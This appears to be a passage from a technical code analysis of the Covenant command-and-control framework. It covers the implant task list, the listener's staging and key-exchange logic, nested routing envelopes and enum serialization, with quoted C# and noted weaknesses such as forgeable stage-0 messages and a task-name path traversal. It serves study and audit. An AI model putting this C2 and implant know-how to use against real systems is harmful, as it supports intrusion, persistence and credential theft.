| `WMIGrunt`, `WMICommand`, `DCOMGrunt`, `DCOMCommand`, `PowerShellRemotingGrunt`, `PowerShellRemotingCommand` | SharpSploit.LateralMovement | WMI `Win32_Process.Create`, DCOM `MMC20.Application`, `WSManConnectionInfo` |
| `PersistStartup`, `PersistCOMHijack`, `PersistWMI`, `PersistAutorun` | SharpSploit.Persistence | `Run` registry key, COM CLSID hijack, WMI `__EventFilter`, autorun dir |
| `PrivExchange` | SharpSploit.PrivilegeEscalation | `PushSubscription` NTLM relay to LDAP |
| `Rubeus`, `SharpDPAPI`, `SharpUp`, `SharpDump`, `Seatbelt`, `SharpWMI` | GhostPack (`ReferenceSourceLibraries`) | Those projects' own source, pulled at build time from `Data/ReferenceSourceLibraries/<Name>/` |
| `SharpSC` | SharpSC | `sc.exe`-equivalent via `ServiceController` |

`[source: Covenant/Data/Tasks/*.yaml, cross-referenced against the grunt switch at Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:104-211 and the task ABI at :244-258]`

**The task ABI, restated at code level.** Every task's `Code` block is compiled into an assembly whose first type is named `Task` and whose first method is named `Execute`, invoked at `GruntHTTP.cs:258` (no `OutputStream`) or streamed at `:266-324` (with `OutputStream`). The YAML `Options[]` list order becomes the `Execute` parameter order, transported as `base64(text)` comma-separated at `:245-250`. A task with declarative `Options: []` produces a zero-arg `Execute`. There is no parameter-type information on the wire — **every argument arrives as a `string`**, so a task declaring an `int` parameter fails `Invoke` with `ArgumentException` and lands in the outer `catch` at `:341`. `[source: Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:244-258]`

**11 of the 95 tasks are `TokenTask: true`** (the SharpSploit.Credentials set listed above) — those are the only ones that take the impersonation branch and therefore the only ones subject to the 5-second `Join` ceiling at `:191`. `[source: Covenant/Data/Tasks/SharpSploit.Credentials.yaml]`

---

## 9. Server-side stage machine — `InternalListener` member-by-member

### 9.1 Class shape

| Member | Lines | Purpose |
|---|---|---|
| `NewMessageArgs : EventArgs` | 26-33 | `{Guid}` — cache-arrival notification |
| `OnNewMessage` event | 35 | Fired when a message lands in the cache |
| `GruntMessageCacheStatus` enum | 42-46 | `Ok`, `NotFound` |
| `GruntMessageCacheInfo` | 47-52 | `{Tasking, Message, Status}` cache entry |
| `ProfileTransformAssembly` | 54-58 | `{Id, ProfileTransformBytes}` — the compiled `MessageTransform` |
| `_hashCodesLock`, `CacheTaskHashCodes` | 60-61 | Dedup set for cached messages |
| `GruntMessageCache` | 62 | `ConcurrentDictionary<string, ConcurrentQueue<GruntMessageCacheInfo>>` — per-GUID outbox |
| `InternalListener()` | 64-67 | Bare ctor |
| `InternalListener(profile, guid, url, token)` | 69-72 | Fire-and-forget `Configure(...)` — **the `_ =` discards the Task, so a failed Configure is silent** |
| `AlwaysRetryPolicy : IRetryPolicy` | 74-88 | 0 s, then 5 s×4, then 10 s forever |
| `Configure(...)` | 90-146 | Compiles the transform, builds the AutoRest client + SignalR hub |
| `ToProfile(Profile)` | 148-158 | Local↔API profile mapping |
| `CreateMessageForGrunt` ×2 | 160-183 | Path-walked nested envelope construction |
| `GetCompressedILAssembly{35,40,30}` | 185-198 | Reads `Data/Tasks/CSharp/Compiled/**/<task>.compiled` |
| `GetGruntTaskingMessage` | 200-241 | Builds the inner tasking payload (base64 assembly + base64 params) |
| `GetTaskingHashCode` / `GetCacheEntryHashCode` | 243-260 | XOR-fold hash for dedup |
| `PushCache` | 262-288 | Enqueue + fire `OnNewMessage` |
| `GetGruntForGuid` | 290+ | GUID→Grunt resolution with the 20-char legacy fallback |
| `InternalRead(guid)` | 295+ | **The entry point** — called by the SignalR `NotifyListener` handler |
| `Write(guid, message)` | 412+ | Cache-read + dispatch into the stage machine |
| `PostTask` | 513-580 | Active/Lost grunt message handling |
| `PostStage0` | 582-682 | Stage 0: RSA key upload + session key issuance |
| `PostStage1` | 684-724 | Stage 1: challenge response |
| `PostStage2` | 726-766 | Stage 2: executor delivery |
| `RegisterGrunt` | 768-818 | Activation + host-info ingest |
| `EncryptUtilities` | 820-892 | All crypto primitives |
| `RSAKeyExtensions` | 1025-1073 | XML RSA key codec |
| `ModelUtilities` | 893-1024 | Message models + `GruntSessionDecrypt` + `ProfileTransform` |

### 9.2 `Configure` — the self-client bootstrap

```csharp
public async Task Configure(APIModels.Profile profile, string ListenerGuid, string CovenantUrl, string CovenantToken)
{
    _transform = new ProfileTransformAssembly
    {
        ProfileTransformBytes = Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
        {
            Language = Grunts.ImplantLanguage.CSharp,
            Source = profile.MessageTransform,
            TargetDotNetVersion = Common.DotNetVersion.NetCore31,
            References = Common.DefaultReferencesNetCore,
            UseSubprocess = false
        })
    };

    X509Certificate2 covenantCert = new X509Certificate2(Common.CovenantPublicCertFile);
    HttpClientHandler clientHandler = new HttpClientHandler
    {
        ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) =>
        {
            return cert.GetCertHashString() == covenantCert.GetCertHashString();
        }
    };
    _client = new CovenantAPI(new Uri(CovenantUrl), new TokenCredentials(CovenantToken), clientHandler);
    _connection = new HubConnectionBuilder()
        .WithUrl(CovenantUrl + "/gruntHub", options => {
            options.AccessTokenProvider = () => { return Task.FromResult(CovenantToken); };
            options.HttpMessageHandlerFactory = inner => {
                var HttpClientHandler = (HttpClientHandler)inner;
                HttpClientHandler.ServerCertificateCustomValidationCallback = clientHandler.ServerCertificateCustomValidationCallback;
                return HttpClientHandler;
            };
        })
        .WithAutomaticReconnect(new AlwaysRetryPolicy())
        .Build();
    _connection.HandshakeTimeout = TimeSpan.FromSeconds(20);
    try
    {
        await Task.Delay(5000);
        await _connection.StartAsync();
        await _connection.InvokeAsync("JoinGroup", ListenerGuid);
        _connection.On<string>("NotifyListener", (guid) => { InternalRead(guid).Wait(); });
    }
    catch (Exception e) { Console.Error.WriteLine("InternalListener SignalRConnection Exception: " + ...); }
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:90-146]`

Four things matter here:

1. **The `MessageTransform` is compiled at listener start** (`:92-102`) from the profile's raw C# source, into a .NET Core 3.1 assembly, **without a subprocess** (`UseSubprocess = false`). This is Roslyn compilation of operator-supplied code inside the server process — the profile `MessageTransform` string is arbitrary C#. The profile YAML in `Data/Profiles/` supplies it.
2. **Certificate validation is hash pinning, not chain validation** (`:107-110`): `cert.GetCertHashString() == covenantCert.GetCertHashString()`. The listener reads its own server cert from `Common.CovenantPublicCertFile` and pins against it. There is no CA check on this path, and `ServerCertificateCustomValidationCallback` replaces the default entirely.
3. **`await Task.Delay(5000)` before `StartAsync`** (`:134`) — a hardcoded 5-second wait so the Kestrel host finishes binding before the listener's SignalR client connects.
4. **`InternalRead(guid).Wait()` inside the `On<string>` handler** (`:139`) — a blocking `.Wait()` on an async method inside a SignalR callback thread. On the SignalR client this runs on a thread-pool thread, so it deadlocks only if `InternalRead` captures a synchronization context; the listener path is not context-bound, so it works — but it does serialize all inbound notifications through one callback thread, and any exception inside `InternalRead` surfaces as an `AggregateException` swallowed by the `catch` at `:142`.

**The `_ = Configure(...)` at `:71`** means a failed Configure (bad profile C#, missing cert, unreachable server) leaves the `InternalListener` object alive with a null `_client` and null `_connection`. Every subsequent method then throws `NullReferenceException` on `_client`, not a diagnosable error. `[source: Covenant/Models/Listeners/InternalListener.cs:69-72]`

### 9.3 `CreateMessageForGrunt` — the nested routing envelope

```csharp
private ModelUtilities.GruntEncryptedMessage CreateMessageForGrunt(APIModels.Grunt grunt, APIModels.Grunt targetGrunt, byte[] message)
{
    List<string> path = _client.GetPathToChildGrunt(grunt.Id ?? default, targetGrunt.Id ?? default).ToList();
    path.Reverse();
    ModelUtilities.GruntEncryptedMessage finalMessage = null;
    ModelUtilities.GruntEncryptedMessageType messageType = ModelUtilities.GruntEncryptedMessageType.Tasking;
    foreach (string guid in path)
    {
        APIModels.Grunt thisGrunt = _client.GetGruntByGUID(guid);
        finalMessage = ModelUtilities.GruntEncryptedMessage.Create(thisGrunt, message, messageType);
        message = Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
        messageType = ModelUtilities.GruntEncryptedMessageType.Routing;
    }
    return finalMessage;
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:165-183]`

This is the **onion-wrapping routing** that explains the relay branch on the implant side (`GruntHTTP.cs:493-503`). For an egress→parent→child path:

- The inner payload starts as `Tasking`.
- The loop walks `path` (egress-first after `Reverse()`), and for **each** hop re-wraps the previous JSON as the `EncryptedMessage` of a new envelope. The last iteration (the egress grunt) produces the outermost envelope.
- After the first iteration `messageType` flips to `Routing` (`:180`) — so hop N-1's envelope *contains* a `Tasking` envelope, and hop N's envelope contains a `Routing` envelope.

Each hop's envelope is encrypted with **that hop's** `GruntNegotiatedSessionKey` (`GruntEncryptedMessage.Create(grunt, ...)` selects the key by status — `ModelUtilities.GruntEncryptedMessage.Create` at `:1009`). So a parent grunt can decrypt its own layer, see `Type = Routing`, and forward the inner blob without being able to read it. The relay lookup at `GruntHTTP.cs:497` matches `wrappedMessage.GUID` against `DownstreamMessengers[].Identifier`. `[source: Covenant/Models/Listeners/InternalListener.cs:165-183]`

If `path` is empty (egress == target, the common single-hop case) the loop never runs and `CreateMessageForGrunt` returns **`null`**. Every caller handles that: `PostStage2` throws `ControllerNotFoundException(emptyTransformed)` at `:758`, `RegisterGrunt` caches `NotFound` at `:810`. `[source: Covenant/Models/Listeners/InternalListener.cs:182]`

### 9.4 `PostStage0` — the key exchange, line by line

```csharp
private async Task PostStage0(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage gruntStage0Response, string targetGuid, string guid)
{
    if (targetGrunt == null || !gruntStage0Response.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)))
    { this.PushCache(guid, NotFound); return; }
```
`[source: Covenant/Models/Listeners/InternalListener.cs:582-589]` — **HMAC verified with the shared secret**, not the session key. At this point no session key exists yet, so the shared secret is the only authenticator. An attacker who learns the shared secret (it is compiled into the stager binary, `GruntHTTPStager.cs:45`) can forge any stage-0 message.

```csharp
    bool egressGruntExists = egressGrunt != null;
    if (targetGrunt.Status != APIModels.GruntStatus.Uninitialized)
    {
        APIModels.Grunt tempModel = new APIModels.Grunt { Id = 0, Name = Utilities.CreateShortGuid(), Guid = targetGuid, OriginalServerGuid = Utilities.CreateShortGuid(), Status = Stage0, ... };
        targetGrunt = await _client.CreateGruntAsync(tempModel);
    }
    else
    {
        targetGrunt.Status = APIModels.GruntStatus.Stage0;
        targetGrunt.Guid = targetGuid;
        targetGrunt.LastCheckIn = DateTime.UtcNow;
        targetGrunt = await _client.EditGruntAsync(targetGrunt);
    }
```
`[source: Covenant/Models/Listeners/InternalListener.cs:591-624]` — **a re-stage-0 of an already-staged grunt creates a *new* grunt row** (`:596-616`) rather than reusing it, copying `ListenerId`, `ImplantTemplateId`, shared secret, pipe name, delay, jitter, kill date, connect attempts, dotnet version, RID — but **not** `GruntRSAPublicKey` or `GruntNegotiatedSessionKey`, which are re-derived. This is the "re-registration" path: a stager re-run against the same shared secret produces a distinct grunt. `[source: Covenant/Models/Listeners/InternalListener.cs:596-616]`

```csharp
    // EncryptedMessage is the RSA Public Key
    targetGrunt.GruntRSAPublicKey = Convert.ToBase64String(EncryptUtilities.AesDecrypt(
        gruntStage0Response,
        Convert.FromBase64String(targetGrunt.GruntSharedSecretPassword)
    ));
    // Generate negotiated session key
    using (Aes newAesKey = Aes.Create())
    {
        newAesKey.GenerateKey();
        targetGrunt.GruntNegotiatedSessionKey = Convert.ToBase64String(newAesKey.Key);
        await _client.EditGruntAsync(targetGrunt);
    }
```
`[source: Covenant/Models/Listeners/InternalListener.cs:630-641]` — the RSA public key arrives **AES-encrypted under the shared secret** and is stored as a **base64 string containing XML**, not base64-of-DER. `GruntRSAEncrypt` at `:890` base64-decodes it back to an XML string. `[source: Covenant/Models/Listeners/InternalListener.cs:630-641]`

```csharp
    if (egressGruntExists)
    {
        List<APIModels.GruntTasking> taskings = _client.GetAllGruntTaskings().ToList();
        // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ guid of some sort?
        APIModels.GruntTasking connectTasking = taskings
            .Where(GT => GT.Type == APIModels.GruntTaskingType.Connect && (GT.Status == Progressed || GT.Status == Tasked))
            .Reverse().FirstOrDefault();
        ...
        targetGrunt.Hostname = tmessage.Message.Split(",")[0];
```
`[source: Covenant/Models/Listeners/InternalListener.cs:643-664]` — **the source itself flags the race** (`:647`). The "most recent open Connect tasking" is found by scanning *all* taskings and reversing — with two simultaneous connects in flight, both children are attributed to the same parent tasking, and `:661` appends both GUIDs to `connectTasking.Parameters`. `tmessage.Message.Split(",")[0]` at `:658` assumes the connect message's first comma-field is the hostname.

```csharp
    byte[] rsaEncryptedBytes = EncryptUtilities.GruntRSAEncrypt(targetGrunt, Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey));
    ModelUtilities.GruntEncryptedMessage message = null;
    try { message = this.CreateMessageForGrunt(egressGrunt, targetGrunt, rsaEncryptedBytes); }
    catch (HttpOperationException) { this.PushCache(guid, NotFound); return; }
    // Stage0Response: "Id,Name,Base64(IV),Base64(AES(RSA(SessionKey))),Base64(HMAC)"
    string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = null });
```
`[source: Covenant/Models/Listeners/InternalListener.cs:666-681]`

**Note the double encryption on the session-key leg.** `GruntRSAEncrypt` at `:666` produces `RSA-OAEP-SHA1(sessionKeyBytes)`. That byte array is then passed as `message` into `CreateMessageForGrunt` (`:670`), which builds `GruntEncryptedMessage.Create(thisGrunt, message, Tasking)` — i.e. **AES-CBC encrypts the RSA output**, producing the `AES(RSA(SessionKey))` the stage comment at `:678` describes. The implant reverses it at `GruntHTTPStager.cs:127-128`: AES-decrypt first, then `rsa.Decrypt(..., true)`. `[source: Covenant/Models/Listeners/InternalListener.cs:666, :678; Covenant/Data/Grunt/GruntHTTP/GruntHTTPStager.cs:127-128]`

The `Tasking` type at `:170` (initial `messageType`) means the outermost stage-0 envelope carries `Type = Tasking`. Combined with §2, this is *exactly* the envelope whose `Type` the implant must `int.Parse` — and the server emits it via `JsonConvert.SerializeObject`.

### 9.5 `PostStage1` and `PostStage2`

`PostStage1` (`:684-724`) — HMAC with the **session key** and a strict status precondition `targetGrunt.Status != Stage0 → NotFound` (`:686`). Generates `challenge2` from `RandomNumberGenerator` (`:698-701`), persists it base64 in `GruntChallenge` (`:703`), advances status to `Stage1`, and returns `CreateMessageForGrunt(egressGrunt, targetGrunt, challenge1.Concat(challenge2).ToArray())` (`:711`) — the 8-byte `challenge1‖challenge2` the implant splits at `GruntHTTPStager.cs:169-172`.

`PostStage2` (`:726-766`) — precondition `Status != Stage1 → NotFound` (`:728`). Decrypts the grunt's echo and compares:

```csharp
byte[] challenge2test = _utilities.GruntSessionDecrypt(targetGrunt, gruntStage2Response);
if (targetGrunt.GruntChallenge != Convert.ToBase64String(challenge2test))
{ this.PushCache(guid, NotFound); return; }
```
`[source: Covenant/Models/Listeners/InternalListener.cs:738-744]` — **a base64 string comparison of the challenge, short-circuiting, non-constant-time.** Same pattern as the HMAC. The comparison is against `Convert.ToBase64String(challenge2test)`, so the *exact bytes* are compared (not a prefix), but the timing still leaks match length.

It then compiles the executor on demand (`:748`):

```csharp
byte[] GruntExecutorAssembly = await this._client.CompileGruntExecutorAsync(targetGrunt.Id ?? default);
```
`[source: Covenant/Models/Listeners/InternalListener.cs:748]` — the executor is compiled **per-grunt** and returned as a byte array through the REST API. The compile is a full Roslyn build of the implant source with all `{{REPLACE_*}}` substitution, which is the slowest step in the handshake. `[source: Covenant/Models/Listeners/InternalListener.cs:748]`

On compile failure the error path is unusual (`:755-759`):

```csharp
catch (HttpOperationException)
{
    string emptyTransformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject("")));
    throw new ControllerNotFoundException(emptyTransformed);
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:757-758]` — an HTTP **404 body shaped as a profile-transformed empty string**. This is the only path in the stage machine that *throws* instead of caching `NotFound`; it propagates out of `Write` into `InternalRead` and then into the SignalR callback, which catches nothing (see `:139` `.Wait()`), so it surfaces as an unobserved Task exception. `[source: Covenant/Models/Listeners/InternalListener.cs:757-758]`

### 9.6 `RegisterGrunt` — activation

In §1.4 the ingest was read; the remaining lines add the **immediate `Tasks` tasking**:

```csharp
ModelUtilities.GruntTaskingMessage tasking = new ModelUtilities.GruntTaskingMessage
{
    Message = targetGrunt.Guid,
    Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
    Type = APIModels.GruntTaskingType.Tasks,
    Token = false
};
```
`[source: Covenant/Models/Listeners/InternalListener.cs:795-801]` — this is the message the implant's `SetAuthenticator(messenger.ReadTaskingMessage().Message)` at `GruntHTTP.cs:78` consumes. `Message = targetGrunt.Guid` is the grunt's own GUID; the implant turns that into the HTTP `Authenticator`. So **the HTTP "authenticator" is the grunt's GUID, echoed back at registration.** `[source: Covenant/Models/Listeners/InternalListener.cs:797]`

The name is `Guid.NewGuid()` → strip dashes → first 10 chars, same construction as the stage-0 GUID (`GruntHTTPStager.cs:44`) and the `PostTask` task-name lookup at `:522`. `[source: Covenant/Models/Listeners/InternalListener.cs:798]`

### 9.7 `PushCache` — the outbox, and a dedup collision

```csharp
private void PushCache(string guid, GruntMessageCacheInfo cacheEntry)
{
    if (this.GruntMessageCache.TryGetValue(guid, out ConcurrentQueue<GruntMessageCacheInfo> cacheQueue))
    {
        lock (_hashCodesLock)
        {
            if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
            {
                cacheQueue.Enqueue(cacheEntry);
                this.OnNewMessage(this, new NewMessageArgs(guid));
            }
        }
    }
    else { cacheQueue = new ConcurrentQueue<...>(); lock (_hashCodesLock) { if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry))) { cacheQueue.Enqueue(cacheEntry); } } this.GruntMessageCache[guid] = cacheQueue; this.OnNewMessage(this, new NewMessageArgs(guid)); }
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:262-288]`

`CacheTaskHashCodes` is a **process-wide `HashSet<int>` keyed only by the tasking hash, not by GUID**. `GetTaskingHashCode` (`:243-255`) XOR-folds `Id ^ GruntId ^ GruntTaskId ^ GruntCommandId ^ (chars of Name)`. For a `Stage0`/`Stage1`/`Stage2`/`Register` cache entry the `Tasking` is `null`, so `GetCacheEntryHashCode` → `GetTaskingHashCode(null)` → `Guid.NewGuid().GetHashCode()` (`:254`) — a **fresh random int every call**. So for the stage-machine entries (all `Tasking = null`) the dedup never suppresses anything, and the same stage response is re-enqueued on every delivery; while for real taskings the XOR hash can collide across different grunts (all four int XORs sum to the same total for distinct components), silently **dropping** a legitimate message. `[source: Covenant/Models/Listeners/InternalListener.cs:243-260]`

The `else` branch (`:276-287`) fires `OnNewMessage` **outside** the `_hashCodesLock` while the `if` branch fires it **inside** — two different locking disciplines for the same notification, so ordering of `OnNewMessage` relative to the enqueue is not consistent between the first-ever message for a GUID and subsequent ones. `[source: Covenant/Models/Listeners/InternalListener.cs:271, :286]`

### 9.8 `GetGruntTaskingMessage` — the tasking payload the grunt receives

```csharp
if (tasking.Type == APIModels.GruntTaskingType.Assembly)
{
    if (version == APIModels.DotNetVersion.Net35)
    {
        Message = Convert.ToBase64String(this.GetCompressedILAssembly35(tasking.GruntTask.Name));
        if (tasking.Parameters.Any())
        {
            Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
        }
    }
    ...
}
else { Message = string.Join(",", tasking.Parameters); }
return new ModelUtilities.GruntTaskingMessage { Type = tasking.Type, Name = tasking.Name, Message = Message, Token = tasking.GruntTask == null ? false : tasking.GruntTask.TokenTask };
```
`[source: Covenant/Models/Listeners/InternalListener.cs:200-241]`

- **`tasking.GruntTask.Name` is used directly as a filename** (`:207`, `:215`, `:223`) with no sanitization: `Common.CovenantTaskCSharpCompiledNet35Directory + taskname + ".compiled"`. A task whose `Name` contains `..\` traverses the directory. Task names come from YAML/DbInitializer, but they are also settable through `GruntTaskApiController` — so the path-traversal surface is reachable from the API. `[source: Covenant/Models/Listeners/InternalListener.cs:185-198, :207]`
- The three `GetCompressedILAssembly*` helpers (`:185-198`) `File.ReadAllBytes` with **no existence check** — a missing `.compiled` throws `FileNotFoundException` out of `GetGruntTaskingMessage` into `PostStage0`'s caller. `[source: Covenant/Models/Listeners/InternalListener.cs:185-198]`
- `Token = tasking.GruntTask.TokenTask` (`:239`) — the `TokenTask` flag is what drives the implant's impersonation branch at `GruntHTTP.cs:181`. **Only tasks with `TokenTask: true` in YAML** (the 11 SharpSploit.Credentials tasks, §8.3) get the thread + `Join(5000)` + `Impersonate` treatment. `[source: Covenant/Models/Listeners/InternalListener.cs:239]`
- For non-`Assembly` taskings, `Message = string.Join(",", tasking.Parameters)` with **no base64 and no escaping** (`:232`) — commas in a parameter break the arity the implant reconstructs. Task options containing a comma (a path list, a command line) therefore mis-split.

### 9.9 `ModelUtilities` — the message models

`InternalListener.cs:893-1024` holds `ModelUtilities` as a nested class. The envelope and tasking models, with their exact serialization attributes, are in §10.

### 9.10 `GruntTaskComponents.cs` — the reference/embedded-resource model layer

300 lines, pure model + serialization. Members:

| Type | Lines | Members |
|---|---|---|
| `ReferenceAssembly` | 13-70 | `Id, Name, Location, DotNetVersion`; `ReferenceSourceLibraries`, `GruntTasks` (`[NotMapped, JsonIgnore, System.Text.Json.Serialization.JsonIgnore]`); `ToSerializedReferenceAssembly`, `FromSerializedReferenceAssembly` (internal); `ToYaml`, `FromYaml`, `ToJson`, `FromJson` |
| `EmbeddedResource` | 72-125 | `Id, Name, Location`; same four ISerializable methods |
| `ReferenceSourceLibrary` | 127-230 | `Id, Name, Description, Location, Language=CSharp, CompatibleDotNetVersions`; `Add/Remove(ReferenceAssembly)`, `Add/Remove(EmbeddedResource)`; `ReferenceAssemblies`, `EmbeddedResources`, `GruntTasks`; `ToSerialized*`, `FromSerialized*`, `ToYaml`, `FromYaml`, `ToJson`, `FromJson` |
| Join entities (6) | 232-275 | `ReferenceSourceLibraryReferenceAssembly`, `ReferenceSourceLibraryEmbeddedResource`, `GruntTaskReferenceSourceLibrary`, `GruntTaskReferenceAssembly`, `GruntTaskEmbeddedResource` — EF Core many-to-many join tables |
| Serialized DTOs (3) | 277-299 | `SerializedReferenceAssembly`, `SerializedEmbeddedResource`, `SerializedReferenceSourceLibrary` |

**The serialization pattern is uniform and worth stating once:** every model exposes `ToYaml()`/`FromYaml()` via a fresh `SerializerBuilder().Build()`/`DeserializerBuilder().Build()` per call, and `ToJson()`/`FromJson()` via static `JsonConvert`. The YAML path is how `DbInitializer` loads the 11 task files; the JSON path is how the API and `InternalListener` move the same objects. `[source: Covenant/Models/Grunts/GruntTaskComponents.cs:47-69, :207-229]`

**Divergence worth flagging:** `ReferenceAssembly` and `EmbeddedResource` join collections are `private`, so EF Core must be configuring them via the `ReferenceSourceLibrary`/`GruntTask` navigation; `GruntTaskComponents.cs:21-22` and `:78-79` expose them only through `[NotMapped]` computed properties. The `[JsonIgnore]` is applied **twice** on the same property with both serializer attributes (`JsonIgnore` = Newtonsoft, `System.Text.Json.Serialization.JsonIgnore` = the built-in one) — defensive against both serializers, which is consistent with `Startup.cs` registering Newtonsoft for MVC while some paths use the default. `[source: Covenant/Models/Grunts/GruntTaskComponents.cs:24-27]`

**`FromSerializedReferenceSourceLibrary` mutates and returns `this`** (`:195-205`) — a fluent-style "load into me" rather than a static factory, matching `FromYaml`/`FromJson`. The `ForEach` at `:202-203` constructs bare `new ReferenceAssembly()` / `new EmbeddedResource()` then fills them, so `Id` is always 0 on a deserialized library — the DB assigns identity on insert. `[source: Covenant/Models/Grunts/GruntTaskComponents.cs:195-205]`

---

## 10. Models and deserialization — the exact JSON shapes

### 10.1 The enum tables, all five of them, with ordinals

| Enum | Declared at | Members (ordinal order) |
|---|---|---|
| `GruntStatus` | `Covenant/Models/Grunts/Grunt.cs:16-27` | `Uninitialized=0, Stage0=1, Stage1=2, Stage2=3, Active=4, Lost=5, Exited=6, Disconnected=7, Hidden=8` |
| `IntegrityLevel` | `Covenant/Models/Grunts/Grunt.cs:29-36` | `Untrusted=0, Low=1, Medium=2, High=3, System=4` |
| `GruntTaskingStatus` (server) | `Covenant/Models/Grunts/GruntTasking.cs:54-61` | `Uninitialized=0, Tasked=1, Progressed=2, Completed=3, Aborted=4` |
| `GruntTaskingType` (server, API) | `Covenant/API/Models/GruntTaskingType.cs:18-40` | `Assembly=0, SetDelay=1, SetJitter=2, SetConnectAttempts=3, SetKillDate=4, Exit=5, Connect=6, Disconnect=7, Tasks=8, TaskKill=9` |
| `GruntEncryptedMessageType` (server) | `Covenant/Models/Listeners/InternalListener.cs:954-958` | `Routing=0, Tasking=1` |
| `GruntTaskingType` (**implant**) | `Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:988-1000` | `Assembly=0, SetDelay=1, SetJitter=2, SetConnectAttempts=3, SetKillDate=4, Exit=5, Connect=6, Disconnect=7, Tasks=8, TaskKill=9` |
| `GruntTaskingStatus` (**implant**) | `Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1035-1042` | `Uninitialized=0, Tasked=1, Progressed=2, Completed=3, Aborted=4` |
| `GruntEncryptedMessageType` (**implant**) | `Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1067-1071` | `Routing=0, Tasking=1` |

**The ordinals are identical across the wire boundary in all four shared enums.** That is the fact that makes the numeric encoding work at all, and it is load-bearing: the implant's `int.Parse` / `Enum.Parse-of-a-numeric-string` only survives because the two enum declarations were kept in the same member order.

### 10.2 The API model forces STRING enums — and this is the interop break's root cause

```csharp
// Covenant/API/Models/GruntTaskingType.cs:17-19
[JsonConverter(typeof(StringEnumConverter))]
public enum GruntTaskingType
{
    [EnumMember(Value = "Assembly")]
    Assembly,
    ...
```
`[source: Covenant/API/Models/GruntTaskingType.cs:17-40]`

`[JsonConverter(typeof(StringEnumConverter))]` on the enum **type** makes Newtonsoft emit and accept the member *name* as a string. So `JsonConvert.SerializeObject(new ModelUtilities.GruntTaskingMessage { Type = GruntTaskingType.SetDelay, ... })` at `InternalListener.cs:162` produces:

```json
{"type":"SetDelay","name":"a1b2c3d4e5","message":"0,MTIz","token":false}
```

And the implant's parser (`GruntHTTP.cs:1016`) does:

```csharp
Type = (GruntTaskingType)Enum.Parse(typeof(GruntTaskingType), parseList[0], true),
```

on `parseList[0]` = `"SetDelay"`. **`Enum.Parse(..., "SetDelay", true)` succeeds** — the ignoreCase overload resolves the member name. So the *tasking* enum round-trips by name, and the case-insensitivity flag is what saves it against any capitalization drift.

Now the envelope, which does **not** have the attribute:

```csharp
// Covenant/Models/Listeners/InternalListener.cs:960-968
public class GruntEncryptedMessage
{
    public string GUID { get; set; }
    public GruntEncryptedMessageType Type { get; set; }
    public string Meta { get; set; } = "";
    public string IV { get; set; }
    public string EncryptedMessage { get; set; }
    public string HMAC { get; set; }
}
```
`[source: Covenant/Models/Listeners/InternalListener.cs:960-968]` — **no `[JsonConverter]` on this enum** (`:954-958` has no attribute). So Newtonsoft serializes `GruntEncryptedMessageType.Tasking` as the **integer** `1`:

```json
{"GUID":"a1b2c3d4e5","Type":1,"Meta":"","IV":"...","EncryptedMessage":"...","HMAC":"..."}
```

And the implant's envelope parser at `GruntHTTP.cs:1102` does `(GruntEncryptedMessageType)int.Parse(parseList[1])` on `"1"` — which **succeeds**.

**So the true state of the wire format is the opposite of T2's inference.** Reconstructed precisely:

| Field | Server emits | Implant parses | Works? |
|---|---|---|---|
| Envelope `Type` | **bare integer** `1` (no `[JsonConverter]` on `GruntEncryptedMessageType`) | `int.Parse` (`GruntHTTP.cs:1102`) | **YES** |
| Tasking `type` | **quoted string** `"SetDelay"` (`[JsonConverter(StringEnumConverter)]`) | `Enum.Parse(..., true)` with a *quoted integer* format (`GruntHTTP.cs:1009`, `:1016`) | **YES by name collision** |
| Tasking `status` | **quoted string** `"Completed"` | `Convert.ToBoolean`/string compare on `parseList[0]` | see below |

The interop hazard is therefore **narrower than T2 stated but still real**: the implant's own format strings write *quoted integers* (`"type":"{0}"` with `ToString("D")` at `:1027`), while the server sends *enum names*. Both happen to parse. But:

1. **The implant's own output is not what the server can read.** The implant writes `{"type":"1",...}` and the server's `JsonConvert.DeserializeObject<ModelUtilities.GruntTaskingMessageResponse>` (`InternalListener.cs:554`) expects `GruntTaskingStatus` — and `GruntTaskingMessageResponse` (`:935-952`) has **no `[JsonConverter]`** on `Status` (it is `APIModels.GruntTaskingStatus?`, declared in `API/Models/GruntTaskingStatus.cs`). If that enum *does* carry `StringEnumConverter`, then the implant's `{"status":"3","output":"..."}` will **fail to deserialize** — Newtonsoft cannot bind the string `"3"` to a `StringEnumConverter` enum, because `StringEnumConverter.ReadJson` looks up the name, not the numeric ordinal, and `"3"` is not a member name.

That is the concrete break. `[source: Covenant/Models/Listeners/InternalListener.cs:554, :944-951; Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs:1054-1062]`

